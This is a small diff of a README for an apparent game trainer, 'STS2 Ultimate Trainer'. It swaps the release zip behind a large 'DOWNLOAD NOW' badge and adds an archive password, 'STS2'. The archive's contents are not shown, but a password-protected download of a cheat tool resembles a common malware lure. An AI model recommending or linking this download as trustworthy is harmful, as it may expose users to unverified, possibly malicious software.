@@ -29,11 +29,12 @@
 ## 📥 Download
 
 <p align="center">
-  <a href="https://github.com/Freewaykyoobliterate/STS2-Ultimate-Trainer/releases/download/495/sts2trainer.zip">
+  <a href="https://github.com/Freewaykyoobliterate/STS2-Ultimate-Trainer/releases/download/495/STS2Ultimate.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
 
+## Password: STS2
 ---
 
 ## ✨ Features
